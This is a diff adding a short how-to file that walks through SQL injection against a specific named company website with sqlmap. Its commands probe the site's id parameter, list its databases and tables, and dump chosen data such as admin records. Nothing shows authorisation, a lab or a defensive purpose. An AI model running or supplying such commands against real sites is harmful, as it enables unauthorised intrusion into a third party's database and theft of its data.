@@ -1,0 +1,25 @@
+
+To check the vulnerability of the webpage
+sqlmap --url http://www.supremeborochem.co.in/products.php?id=3 --dbs --risk=2 --level=3
+
+
+We Will get an parameter id which can notice the vulnerability of site,after that we can proceed to the further step.
+
+
+To acquire the sql data of the site which gathers the database , we need to command the following:
+
+sqlmap --url http://www.supremeborochem.co.in/products.php?id=3 --dbs --tables
+
+We can gather the data of the tables and columns which are loaded aside.
+
+To get the  access into the site of the database,use the following commands 
+sqlmap-h
+
+
+We can  get the following options copy and paste by the categories we want like data,admin so on...,,by using the command:
+
+
+
+sqlmap --url http://www.supremeborochem.co.in/products.php?id=3   --(paste category here )
+
+Then we can get the data of the particular one from the webpage.
